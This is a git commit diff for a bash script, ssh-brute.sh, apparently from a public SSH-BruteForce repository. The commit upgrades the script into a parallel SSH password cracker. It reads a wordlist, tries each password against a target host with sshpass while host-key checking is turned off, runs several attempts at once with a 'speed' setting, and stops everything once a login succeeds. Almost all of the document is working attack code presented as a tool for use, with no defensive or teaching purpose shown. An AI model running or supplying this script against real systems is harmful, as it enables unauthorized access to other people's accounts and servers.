436a2a22b9518b2c7972a681ff671fa236bd0f81
Bananut <98269573+Bananut@users.noreply.github.com>
2024-08-20 20:07:20 +0200

    Update ssh-brute.sh
    made it wayyyy faster

--- SSH-BruteForce/ssh-brute.sh
+++ SSH-BruteForce/ssh-brute.sh
@@ -9,12 +9,19 @@ title=$(cat <<'EOF'
  /        \/        \    Y    / /_____/ |    |   \ |  | \/  |  /|  | \  ___/ 
 /_______  /_______  /\___|_  /          |______  / |__|  |____/ |__|  \___  >
         \/        \/       \/                  \/                         \/ 
-version 1.0, made by bananut
+version 1.1, made by bananut
 EOF
 )
 
-#Help string
-help="example usage: ./ssh_password_cracker.sh <user> </path/to/wordlist.txt> <target_adress>"
+# Check for help command
+if [[ $1 == "-h" || $1 == "--help" ]]; then
+  echo "Info: an ssh brute-forcing tool for cracking a users password"
+  echo "Usage: $0 <username> <path/to/wordlist.txt> <ip_adress> <speed>"
+  echo "     - speed changes the amount of login tries running at the same time"
+  echo "     - if speed isn't set, defaults to 5"
+  exit 1
+fi
+
 
 # Function to handle the interrupt signal (Ctrl+C)
 cleanup() {
@@ -29,15 +36,10 @@ trap cleanup INT
 user=$1
 wordlist=$2
 adress=$3
+speed=$4
 
 # Print the title
 echo "$title"
-
-# Check for help command
-if [[ "$user" == "help" || "$user" == "-h" || "$user" == "--help" ]]; then
-  echo -e  "$help"
-  exit
-fi
 
 # Ping to see if the adress is up
 if ping -q -c 2 -W 1 "$adress" > /dev/null; then
@@ -50,26 +52,42 @@ fi
 
 # Check for the wordlist
 if [[ -z "$wordlist" ]]; then
-        echo "Wordlist not found"
-        exit
+  echo "Wordlist not found"
+  exit
 fi
 
-# Set user to admin if its empty
-if [[ -z "$user" ]]; then
-        user="admin"
+# If speed isn't set, set to default
+if [[ -z "$speed" ]]; then
+  speed=5
 fi
 
-# Brute force password
-for passwd in $(cat "$wordlist");
-do
-  echo "Loging in into adress:$adress with password:$passwd as user:$user"
-  if sshpass -p "$passwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -l "$user" "$adress" "exit" 2>/dev/null; then
-    echo "Success, Logged in using password:$passwd"
-    exit
-  else
-    echo "Incorrect Password"
-  fi
-done
+# Main loop
+max_parallel="$speed"
+{
+  # Brute force password
+  for passwd in $(cat "$wordlist");
+  do
+    (
+      echo "Loging in into adress:$adress with password:$passwd as user:$user"
+      if sshpass -p "$passwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -l "$user" "$adress" "exit" 2>/dev/null; then
+        # Successful login
+        echo "Success, Logged in using password:$passwd"
+        kill 0
+        exit 0
+      fi
+
+      wait
+
+    ) &
+
+    # Limit max number of parallel jobs
+    if [[ $(jobs -r -p | wc -l) -ge $max_parallel ]]; then
+      wait -n # Wait for a job to finish, to start a new one
+    fi
+  done
+
+  wait
+} 2>/dev/null
 
 # End script if no password worked :(
 echo "No password in wordlist matched"
